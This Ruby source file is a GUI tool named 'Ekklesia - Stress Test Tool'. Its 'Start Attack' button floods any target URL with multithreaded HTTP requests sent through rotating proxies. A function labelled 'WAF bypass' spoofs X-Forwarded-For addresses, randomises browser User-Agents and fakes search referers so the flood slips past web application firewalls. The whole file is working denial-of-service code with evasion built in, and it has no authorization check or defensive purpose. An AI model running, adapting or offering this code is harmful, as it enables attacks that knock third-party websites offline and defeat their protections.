require 'tk'
require 'net/http'
require 'uri'
require 'thread'

# Function to send requests with WAF bypass
def send_request(url, method, proxy = nil)
  uri = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == "https")

  if proxy
    proxy = "http://#{proxy}" unless proxy.start_with?("http://", "https://")
    proxy_uri = URI.parse(proxy)
    http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
  end

  headers = {
    "User-Agent" => "Mozilla/#{rand(5..10)}.0 (Windows NT #{rand(6..10)}.#{rand(0..3)}) Gecko/#{rand(20100101..20221231)} Firefox/#{rand(50..100)}",
    "X-Forwarded-For" => "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}",
    "Referer" => "https://google.com/search?q=#{rand(1000)}"
  }

  begin
    request = case method.upcase
              when "GET"
                Net::HTTP::Get.new(uri.request_uri, headers)
              when "POST"
                Net::HTTP::Post.new(uri.request_uri, headers).tap { |r| r.set_form_data({ key: "value" }) }
              when "HEAD"
                Net::HTTP::Head.new(uri.request_uri, headers)
              else
                raise "[!] Unsupported HTTP method: #{method}"
              end

    response = http.request(request)
    return response.code.to_i
  rescue => e
    return 0
  end
end

# Function to perform the stress test
def stress_test(url, threads, requests_per_thread, proxies, method, output)
  thread_pool = []
  proxies_cycle = proxies.cycle if proxies.any?

  threads.times do
    thread_pool << Thread.new do
      requests_per_thread.times do
        proxy = proxies.any? ? proxies_cycle.next : nil
        code = send_request(url, method, proxy)

        output.insert('end', "[+] Sent via #{proxy || 'direct connection'} - Response: #{code}\n")
        output.see('end')
      end
    end
  end

  thread_pool.each(&:join)
  output.insert('end', "[+] Stress test completed.\n")
end

# Function to start the attack from the GUI
def start_attack(url, threads, requests_per_thread, proxy_file, method, output)
  proxies = []
  if proxy_file && File.exist?(proxy_file)
    proxies = File.readlines(proxy_file).map(&:strip)
    output.insert('end', "[+] Loaded #{proxies.size} proxies.\n")
  else
    output.insert('end', "[!] Proxy file not found or empty.\n")
  end

  output.insert('end', "[+] Starting attack on #{url} with #{threads} threads, #{requests_per_thread} requests per thread.\n")
  stress_test(url, threads, requests_per_thread, proxies, method, output)
end

# Initialize the GUI
root = TkRoot.new do
  title 'Ekklesia - Stress Test Tool'
  minsize(600, 400)
end

TkLabel.new(root) do
  text "Ekklesia - Stress Test Tool"
  font 'Arial 16 bold'
  pack(pady: 10)
end

TkLabel.new(root) do
  text "Target URL:"
  pack(anchor: 'w', padx: 10)
end
url_entry = TkEntry.new(root) do
  width 50
  pack(pady: 5, padx: 10, fill: 'x')
end

TkLabel.new(root) do
  text "Number of Threads:"
  pack(anchor: 'w', padx: 10)
end
threads_entry = TkEntry.new(root) do
  width 20
  insert(0, '10') # Default value
  pack(pady: 5, padx: 10, fill: 'x')
end

TkLabel.new(root) do
  text "Requests per Thread:"
  pack(anchor: 'w', padx: 10)
end
requests_entry = TkEntry.new(root) do
  width 20
  insert(0, '100') # Default value
  pack(pady: 5, padx: 10, fill: 'x')
end

TkLabel.new(root) do
  text "Proxy File Path (optional):"
  pack(anchor: 'w', padx: 10)
end
proxy_entry = TkEntry.new(root) do
  width 50
  pack(pady: 5, padx: 10, fill: 'x')
end

TkLabel.new(root) do
  text "HTTP Method (GET/POST/HEAD):"
  pack(anchor: 'w', padx: 10)
end
method_entry = TkEntry.new(root) do
  width 20
  insert(0, 'GET') # Default value
  pack(pady: 5, padx: 10, fill: 'x')
end

output_text = TkText.new(root) do
  width 70
  height 15
  state 'normal'
  wrap 'word'
  pack(pady: 10, padx: 10)
end

TkButton.new(root) do
  text "Start Attack"
  command proc {
    target_url = url_entry.get
    threads = threads_entry.get.to_i
    requests = requests_entry.get.to_i
    proxy_file = proxy_entry.get
    method = method_entry.get

    output_text.insert('end', "[+] Starting attack...\n")
    Thread.new { start_attack(target_url, threads, requests, proxy_file, method, output_text) }
  }
  pack(pady: 10)
end

Tk.mainloop
